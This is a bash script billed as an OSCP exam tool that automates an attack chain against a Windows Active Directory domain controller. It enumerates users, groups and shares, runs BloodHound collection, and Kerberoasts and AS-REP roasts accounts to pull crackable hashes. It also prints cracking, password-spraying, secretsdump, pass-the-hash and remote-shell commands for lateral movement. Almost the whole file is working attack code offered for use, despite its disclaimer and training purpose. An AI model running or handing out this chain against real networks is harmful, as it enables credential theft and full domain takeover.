#!/bin/bash
#==============================================================================
# OSCP Active Directory Attack Script
# Usage: ./ad-attack.sh <dc_ip> <domain> [username] [password]
# For the AD set - you start with credentials (simulated breach)
# DISCLAIMER: For authorized security testing only. Do not use against systems
# without explicit written permission. The author assumes no liability for
# misuse. You are responsible for compliance with all applicable laws.
#==============================================================================

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Arguments
DC_IP=${1:?Usage: $0 <dc_ip> <domain> [username] [password]}
DOMAIN=${2:?Usage: $0 <dc_ip> <domain> [username] [password]}
USERNAME=${3:-""}
PASSWORD=${4:-""}

OUTDIR="./ad_$DOMAIN"
mkdir -p "$OUTDIR"/{bloodhound,users,hashes,shares}

banner() {
    echo -e "\n${BLUE}========================================${NC}"
    echo -e "${GREEN}[*] $1${NC}"
    echo -e "${BLUE}========================================${NC}"
}

info() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
finding() { echo -e "${RED}[!!!]${NC} $1"; }
cmd() { echo -e "${CYAN}[CMD]${NC} $1"; }

banner "OSCP AD ATTACK - $DOMAIN"
echo "DC IP: $DC_IP"
echo "Domain: $DOMAIN"
echo "Username: ${USERNAME:-'(none provided)'}"
echo "Output: $OUTDIR"

#------------------------------------------------------------------------------
# UNAUTHENTICATED ENUMERATION
#------------------------------------------------------------------------------
if [ -z "$USERNAME" ]; then
    banner "UNAUTHENTICATED ENUMERATION"
    
    info "Checking for null session..."
    crackmapexec smb "$DC_IP" -u '' -p '' --shares > "$OUTDIR/shares/null_session.txt" 2>&1
    cat "$OUTDIR/shares/null_session.txt"
    
    info "Enumerating users via RID brute..."
    crackmapexec smb "$DC_IP" -u '' -p '' --rid-brute > "$OUTDIR/users/rid_brute.txt" 2>&1 &
    
    info "Checking for AS-REP roastable users (no creds needed)..."
    warn "Need a userlist first. Common usernames to try:"
    echo "administrator, admin, guest, krbtgt, svc_*, backup, sql, web, ftp"
    
    info "LDAP anonymous bind check..."
    ldapsearch -x -H "ldap://$DC_IP" -b "DC=${DOMAIN//./,DC=}" "(objectClass=*)" 2>/dev/null | head -50 > "$OUTDIR/users/ldap_anon.txt"
    
    exit 0
fi

#------------------------------------------------------------------------------
# AUTHENTICATED ENUMERATION
#------------------------------------------------------------------------------
banner "AUTHENTICATED ENUMERATION (as $USERNAME)"

# Validate credentials
info "Testing credentials..."
crackmapexec smb "$DC_IP" -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN"

#------------------------------------------------------------------------------
# USER ENUMERATION
#------------------------------------------------------------------------------
banner "USER ENUMERATION"

info "Dumping all domain users..."
crackmapexec smb "$DC_IP" -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" --users > "$OUTDIR/users/all_users.txt" 2>&1
cat "$OUTDIR/users/all_users.txt"

info "Extracting usernames to wordlist..."
grep -oP '\\\\\K[^\s]+' "$OUTDIR/users/all_users.txt" 2>/dev/null | sort -u > "$OUTDIR/users/userlist.txt"
info "User wordlist: $OUTDIR/users/userlist.txt ($(wc -l < "$OUTDIR/users/userlist.txt") users)"

info "Dumping domain groups..."
crackmapexec smb "$DC_IP" -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" --groups > "$OUTDIR/users/groups.txt" 2>&1

info "Checking Domain Admins..."
net rpc group members "Domain Admins" -I "$DC_IP" -U "$DOMAIN/$USERNAME%$PASSWORD" > "$OUTDIR/users/domain_admins.txt" 2>&1 || true
cat "$OUTDIR/users/domain_admins.txt"

#------------------------------------------------------------------------------
# SHARE ENUMERATION
#------------------------------------------------------------------------------
banner "SHARE ENUMERATION"

info "Enumerating shares with smbmap..."
smbmap -H "$DC_IP" -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" > "$OUTDIR/shares/smbmap.txt" 2>&1
cat "$OUTDIR/shares/smbmap.txt"

info "Spider shares for interesting files..."
crackmapexec smb "$DC_IP" -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" --shares > "$OUTDIR/shares/cme_shares.txt" 2>&1
crackmapexec smb "$DC_IP" -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -M spider_plus -o EXCLUDE_DIR=IPC$ > "$OUTDIR/shares/spider.txt" 2>&1 &

#------------------------------------------------------------------------------
# BLOODHOUND COLLECTION
#------------------------------------------------------------------------------
banner "BLOODHOUND DATA COLLECTION"

info "Running bloodhound-python..."
cd "$OUTDIR/bloodhound"
bloodhound-python -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -dc "$DC_IP" -c all --zip 2>&1 | tee bloodhound_collection.log
cd - > /dev/null

finding "BloodHound data collected! Import into BloodHound GUI"
warn "Look for: Shortest Path to Domain Admins, Kerberoastable Users, AS-REP Roastable"

#------------------------------------------------------------------------------
# KERBEROASTING
#------------------------------------------------------------------------------
banner "KERBEROASTING"

info "Looking for Kerberoastable accounts..."
impacket-GetUserSPNs "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip "$DC_IP" -request -outputfile "$OUTDIR/hashes/kerberoast.txt" 2>&1 | tee "$OUTDIR/hashes/kerberoast_output.txt"

if [ -s "$OUTDIR/hashes/kerberoast.txt" ]; then
    finding "Kerberoastable hashes found!"
    cat "$OUTDIR/hashes/kerberoast.txt"
    warn "Crack with: hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt"
    warn "Or: john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt"
else
    info "No Kerberoastable accounts found"
fi

#------------------------------------------------------------------------------
# AS-REP ROASTING
#------------------------------------------------------------------------------
banner "AS-REP ROASTING"

info "Looking for AS-REP roastable accounts..."
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC_IP" -usersfile "$OUTDIR/users/userlist.txt" -format hashcat -outputfile "$OUTDIR/hashes/asrep.txt" 2>&1 | tee "$OUTDIR/hashes/asrep_output.txt"

if [ -s "$OUTDIR/hashes/asrep.txt" ]; then
    finding "AS-REP roastable hashes found!"
    cat "$OUTDIR/hashes/asrep.txt"
    warn "Crack with: hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
else
    info "No AS-REP roastable accounts found"
fi

#------------------------------------------------------------------------------
# PASSWORD SPRAYING
#------------------------------------------------------------------------------
banner "PASSWORD SPRAYING"

warn "Ready to spray. Common passwords to try:"
echo "  - ${DOMAIN}123"
echo "  - Password1"
echo "  - Welcome1"
echo "  - Season+Year (Summer2024, Winter2024)"
echo "  - Company+123"
echo ""
cmd "crackmapexec smb $DC_IP -u $OUTDIR/users/userlist.txt -p 'Password123' -d $DOMAIN --continue-on-success"
warn "Be careful with lockout policies!"

#------------------------------------------------------------------------------
# SECRETS DUMP (if admin creds obtained)
#------------------------------------------------------------------------------
banner "POST-EXPLOITATION (run when you have admin creds)"

warn "Once you have Domain Admin or local admin on DC:"
echo ""
cmd "impacket-secretsdump $DOMAIN/ADMIN_USER:PASSWORD@$DC_IP"
cmd "impacket-secretsdump $DOMAIN/ADMIN_USER@$DC_IP -hashes LMHASH:NTHASH"
echo ""
warn "Pass-the-Hash:"
cmd "crackmapexec smb $DC_IP -u Administrator -H NTHASH -d $DOMAIN"
cmd "impacket-psexec $DOMAIN/Administrator@$DC_IP -hashes :NTHASH"
cmd "impacket-wmiexec $DOMAIN/Administrator@$DC_IP -hashes :NTHASH"
cmd "evil-winrm -i $DC_IP -u Administrator -H NTHASH"

#------------------------------------------------------------------------------
# LATERAL MOVEMENT COMMANDS
#------------------------------------------------------------------------------
banner "LATERAL MOVEMENT CHEATSHEET"

echo "=== With Password ==="
cmd "impacket-psexec $DOMAIN/$USERNAME:'$PASSWORD'@TARGET_IP"
cmd "impacket-wmiexec $DOMAIN/$USERNAME:'$PASSWORD'@TARGET_IP"
cmd "impacket-smbexec $DOMAIN/$USERNAME:'$PASSWORD'@TARGET_IP"
cmd "evil-winrm -i TARGET_IP -u $USERNAME -p '$PASSWORD'"
echo ""
echo "=== With Hash ==="
cmd "impacket-psexec $DOMAIN/$USERNAME@TARGET_IP -hashes :NTHASH"
cmd "crackmapexec smb TARGET_IP -u $USERNAME -H NTHASH -d $DOMAIN -x 'whoami'"
echo ""
echo "=== WinRM (port 5985) ==="
cmd "evil-winrm -i TARGET_IP -u $USERNAME -p '$PASSWORD'"

#------------------------------------------------------------------------------
# SUMMARY
#------------------------------------------------------------------------------
banner "ENUMERATION COMPLETE"

echo ""
info "Output directory: $OUTDIR"
echo ""
warn "=== ATTACK PRIORITY ==="
echo "1. Check BloodHound for attack paths"
echo "2. Crack any Kerberoast/AS-REP hashes"
echo "3. Check shares for credentials/scripts"
echo "4. Password spray (carefully!)"
echo "5. Pivot to other machines with obtained creds"
echo "6. Dump secrets from DC when you have admin"
echo ""
finding "Remember: NO METASPLOIT on AD set!"

